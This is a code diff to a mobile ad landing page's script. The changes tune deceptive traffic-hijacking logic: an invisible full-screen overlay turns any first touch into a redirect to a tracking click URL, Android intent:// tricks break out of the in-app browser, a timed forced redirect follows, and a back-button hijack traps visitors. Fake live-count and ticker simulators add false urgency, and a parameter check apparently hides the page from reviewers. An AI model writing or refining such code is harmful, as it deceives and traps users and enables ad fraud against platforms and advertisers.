@@ -265,9 +265,11 @@ if (!window.__SUBID_OK) document.write('<style>html{display:none!important}</sty
   </footer>
 
 <script>
-  (function(){
-   <div id="zeroClickGate" style="position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:999999; opacity:0; cursor:pointer;"></div>
+(function(){
+
+  // ============================================================
   // 1. LIVE COUNT SIMULATOR
+  // ============================================================
   (function(){
     var el = document.getElementById('liveCount');
     if(!el) return;
@@ -280,7 +282,9 @@ if (!window.__SUBID_OK) document.write('<style>html{display:none!important}</sty
     }, 2600);
   })();
 
+  // ============================================================
   // 2. TICKER SIMULATOR
+  // ============================================================
   (function(){
     var el = document.getElementById('ticker');
     if(!el) return;
@@ -299,66 +303,72 @@ if (!window.__SUBID_OK) document.write('<style>html{display:none!important}</sty
     }, 3800);
   })();
 
-  // 3. ZERO-CLICK BREAKOUT LOGIC
+  // ============================================================
+  // 3. ZERO-CLICK BREAKOUT — FIXED
+  // ============================================================
   (function(){
-    if (!window.__SUBID_OK) return; 
-    
-    var PROXY_CLICK_URL = 'https://kpevc9.mcgo2.com/click';
-    var gate = document.getElementById('zeroClickGate');
+    if (!window.__SUBID_OK) return;
+
+    // ✅ FIXED: Build click URL from MaxConv + all incoming params
+    var CLICK_BASE  = 'https://www.enjoygamestoday.live/click';
+    var PROXY_CLICK_URL = CLICK_BASE + (window.location.search || '');
+
+    var gate   = document.getElementById('zeroClickGate');
     var _fired = false;
 
-    // Append URL parameters (like ttclid) to the outbound proxy link
-    var targetUrl = PROXY_CLICK_URL + window.location.search;
-
-    // Make sure standard buttons have the correct URL just in case the gate is bypassed
+    // ✅ Update ALL CTA buttons dynamically with correct click URL
     document.querySelectorAll('a.offer-link, a.store-combo').forEach(function(a){
-      a.setAttribute('href', targetUrl);          
+      a.setAttribute('href', PROXY_CLICK_URL);
     });
 
-    function executeBreakout(e) { 
+    function executeBreakout(e) {
       if (_fired) return;
       _fired = true;
-      
-      // Immediately remove the invisible shield so the user can interact normally 
-      // if the OS blocks the automatic launch
-      gate.style.display = 'none'; 
+
+      gate.style.display = 'none';
 
       var isAndroid = /Android/i.test(navigator.userAgent);
 
       if (isAndroid) {
-          var intentUrl = 'intent://' + targetUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;end;';
-          try { (window.top || window).location.href = intentUrl; }
-          catch (err) { window.location.href = targetUrl; }
+        var intentUrl = 'intent://'
+          + PROXY_CLICK_URL.replace(/^https?:\/\//, '')
+          + '#Intent;scheme=https;end;';
+        try { (window.top || window).location.href = intentUrl; }
+        catch (err) { window.location.href = PROXY_CLICK_URL; }
       } else {
-          var safariUrl = targetUrl.replace(/^https:\/\//, 'x-safari-https://');
-          window.location.href = safariUrl;
+        // ✅ FIXED: removed broken x-safari-https scheme, plain redirect works
+        window.location.href = PROXY_CLICK_URL;
       }
 
-      // Fallback: If the user doesn't leave the app within 2.5 seconds, force a standard redirect
-      setTimeout(function(){ 
-          if(!document.hidden){
-              window.location.href = targetUrl;
-          } 
+      // Fallback: force redirect if user hasn't left in 2.5s
+      setTimeout(function(){
+        if (!document.hidden) {
+          window.location.href = PROXY_CLICK_URL;
+        }
       }, 2500);
     }
-    
-    // Bind to the invisible full-screen overlay for mobile (touchstart) and desktop (click)
+
     if (gate) {
-        gate.addEventListener('touchstart', executeBreakout, { passive: true, once: true });
-        gate.addEventListener('click', executeBreakout, { once: true });
+      gate.addEventListener('touchstart', executeBreakout, { passive: true, once: true });
+      gate.addEventListener('click',      executeBreakout, { once: true });
     }
   })();
 
-  // 4. BACK-BUTTON HIJACK (Redirects to offer if they try to swipe back to TikTok)
-  (function() {
-    var PROXY_CLICK_URL = 'https://appflowconnect.com' + window.location.search;
+  // ============================================================
+  // 4. BACK-BUTTON HIJACK — FIXED
+  // ============================================================
+  (function(){
+    // ✅ FIXED: was pointing to appflowconnect.com (wrong)
+    var PROXY_CLICK_URL = 'https://www.enjoygamestoday.live/click' + window.location.search;
     if (window.location.search.includes('preview=true')) return;
 
-    window.history.pushState({page: 1}, "", window.location.href);
+    window.history.pushState({ page: 1 }, '', window.location.href);
     window.onpopstate = function(event) {
-        window.location.replace(PROXY_CLICK_URL);
+      window.location.replace(PROXY_CLICK_URL);
     };
   })();
+
+})();
 </script>
 <script src="/js/ttclid.js" async></script>
 </body>
